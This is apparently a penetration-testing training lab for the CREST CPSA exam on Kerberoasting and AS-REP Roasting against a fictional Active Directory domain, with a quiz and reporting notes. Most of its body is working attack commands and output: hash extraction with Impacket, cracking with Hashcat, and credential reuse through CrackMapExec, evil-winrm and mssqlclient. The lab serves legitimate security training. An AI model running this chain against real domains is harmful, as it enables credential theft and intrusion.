Lab E5-A: Kerberos Attacks - Kerberoasting and AS-REP Roasting

Module E Kerberos CREST CPSA Difficulty: Intermediate Estimated time: 60 min

Engagement Scenario

Your AD enumeration identified Kerberoastable service accounts and accounts with pre-authentication disabled. You now have two offline cracking opportunities. Run both attacks against the Syntex domain, crack the resulting hashes with Hashcat, and use the recovered credentials for lateral movement and privilege escalation.

Learning Objectives

  • Understand the technical difference between Kerberoasting and AS-REP Roasting
  • Extract Kerberoastable TGS tickets using GetUserSPNs.py
  • Extract AS-REP hashes using GetNPUsers.py without credentials
  • Crack both hash types with Hashcat and use recovered credentials

Kerberoasting vs AS-REP Roasting: Understanding the Difference

Theory

Both attacks exploit Kerberos protocol behaviour to obtain offline-crackable hashes. They target different conditions in Active Directory:

PropertyKerberoastingAS-REP Roasting
Requires credentials?Yes (any domain account)No - unauthenticated
AD conditionAccount has an SPN setPre-authentication disabled (UF_DONT_REQUIRE_PREAUTH)
Kerberos message usedTGS-REQ / TGS-REPAS-REQ / AS-REP
What is encrypted?TGS ticket (encrypted with service account NTLM hash)AS-REP message (encrypted with account NTLM hash)
Hashcat mode1310018200
Impacket toolGetUserSPNs.pyGetNPUsers.py
★
CREST CPSA Exam Point: This table is examined directly. Know which attack requires credentials and which does not. AS-REP Roasting (no credentials needed) should always be attempted first when you have no domain access - it may give you your first foothold. Kerberoasting requires at least one valid credential but targets accounts running services (which often have weak passwords set by administrators).
2

Kerberoasting with GetUserSPNs.py

Impacket

Kerberoasting works by requesting a TGS (service ticket) for any account with an SPN. The ticket is encrypted with the service account's NTLM hash - you take this ticket offline and crack it.

First, enumerate all Kerberoastable accounts - accounts with SPNs set:

# List Kerberoastable accounts (no ticket request yet)
GetUserSPNs.py syntex.local/svc-backup:Password1 -dc-ip <DC01-IP>

ServicePrincipalName                    Name        MemberOf  PasswordLastSet
--------------------------------------  ----------  --------  --------------------
MSSQLSvc/SYNTEX-DC01.syntex.local:1433  svc-backup            2023-10-01 09:00:00
HTTP/SYNTEX-DC01.syntex.local           svc-backup            2023-10-01 09:00:00

Now request the TGS tickets for offline cracking (add -request flag):

# Request TGS tickets for ALL Kerberoastable accounts
GetUserSPNs.py syntex.local/svc-backup:Password1 -dc-ip <DC01-IP> -request

$krb5tgs$23$*svc-backup$SYNTEX.LOCAL$syntex.local/svc-backup*$a1b2c3d4e5f6...
[long hash string continues]

# Save the output to a file
GetUserSPNs.py syntex.local/svc-backup:Password1 -dc-ip <DC01-IP> -request -outputfile kerberoast_hashes.txt

Crack the TGS tickets with Hashcat. Mode 13100 is Kerberos 5 TGS-REP etype 23:

# Crack Kerberoast hashes - mode 13100
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt

$krb5tgs$23$*svc-backup$...:Password1

Status...........: Cracked

# Show cracked
hashcat -m 13100 kerberoast_hashes.txt --show
⚠
Reporting Note: Kerberoastable accounts are a HIGH finding regardless of whether the password is cracked. The ticket itself is requestable by any domain user - the vulnerability is that the service account has a weak or guessable password, combined with having an SPN set. Report both the enumeration and the cracked credential separately.

AS-REP Roasting with GetNPUsers.py

Impacket

AS-REP Roasting targets accounts with pre-authentication disabled (UF_DONT_REQUIRE_PREAUTH flag). When pre-auth is disabled, any host on the network can request an AS-REP for that account - no credentials needed. The AS-REP contains data encrypted with the account's NTLM hash.

From Kali with no domain credentials, enumerate AS-REP Roastable accounts using a username list:

# Create a username list from enum4linux-ng or ldapdomaindump output
cat users.txt
Administrator
jsmith
svc-backup
syntex-admin

# AS-REP Roasting - no credentials needed, just a username list
GetNPUsers.py syntex.local/ -usersfile users.txt -dc-ip <DC01-IP> -no-pass -format hashcat

$krb5asrep$23$jsmith@SYNTEX.LOCAL:4a2b1c3d...
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User svc-backup doesn't have UF_DONT_REQUIRE_PREAUTH set

# jsmith is vulnerable - save the hash
GetNPUsers.py syntex.local/ -usersfile users.txt -dc-ip <DC01-IP> -no-pass -format hashcat -outputfile asrep_hashes.txt

With domain credentials (e.g. svc-backup), you can query for all AS-REP Roastable accounts directly without needing a username list:

# With credentials - automatically finds all vulnerable accounts
GetNPUsers.py syntex.local/svc-backup:Password1 -dc-ip <DC01-IP> -format hashcat -outputfile asrep_hashes.txt

Crack with Hashcat mode 18200:

# Crack AS-REP hashes - mode 18200
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt

$krb5asrep$23$jsmith@SYNTEX.LOCAL:4a2b1c3d...:Welcome1

Status...........: Cracked
★
CREST CPSA Exam Point: AS-REP Roasting is your first attack when you have NO domain credentials. Kerberoasting requires credentials to request TGS tickets. AS-REP only requires a username list and network access to the DC on port 88 (Kerberos). In a black-box assessment, always try AS-REP first using a username list built from OSINT or SMTP enumeration.

Using Recovered Credentials

Post-Exploit

You now have two cracked credentials: svc-backup / Password1 (Kerberoasted) and jsmith / Welcome1 (AS-REP Roasted). Test each against all network services:

# Test both credentials across the network with CrackMapExec
crackmapexec smb <DC01-IP> -u jsmith -p Welcome1
crackmapexec winrm <DC01-IP> -u jsmith -p Welcome1
crackmapexec mssql <DC01-IP> -u jsmith -p Welcome1

# If jsmith has WinRM access, get a shell
evil-winrm -i <DC01-IP> -u jsmith -p Welcome1

Also test credentials against the SQL instance discovered earlier:

# The sa account on the SQL instance uses Syntex2024!
# Use Impacket mssqlclient for direct SQL access
mssqlclient.py syntex.local/sa:Syntex2024! @<DC01-IP> -windows-auth

# Or with the syntex_app SQL account
mssqlclient.py syntex_app:AppPass1 @<DC01-IP>

Knowledge Check

Q1. You have no domain credentials at all. Which attack can you still attempt?

A. Kerberoasting - it only needs a username
B. AS-REP Roasting - it works without authentication
C. Both require domain credentials
D. Neither - you need a valid session first

Q2. GetUserSPNs.py returns a hash starting with $krb5tgs$23$*. What Hashcat mode do you use to crack it?

A. 5600 (NetNTLMv2)
B. 18200 (AS-REP)
C. 13100 (Kerberoasting TGS)
D. 1000 (NT hash)

Q3. What Active Directory attribute, when disabled, makes an account vulnerable to AS-REP Roasting?

Kerberos pre-authentication. When the "Do not require Kerberos preauthentication" flag (UF_DONT_REQUIRE_PREAUTH, userAccountControl bit 0x400000 = 4194304) is set on a user object, the KDC will issue an AS-REP for that user to any requestor without verifying their identity first. The AS-REP is encrypted with the user's NTLM hash, enabling offline cracking.

Key Takeaways

  • AS-REP Roasting needs no credentials - try it first when you have zero domain access
  • Kerberoasting needs one valid domain credential - it targets service accounts with weak passwords
  • Hashcat 13100 for Kerberoasting, 18200 for AS-REP Roasting - memorise these for CPSA
  • After cracking, test recovered credentials across all services: SMB, WinRM, MSSQL, RDP
  • Service accounts (svc-*) are high-value Kerberoasting targets - they often have old, weak passwords set by administrators
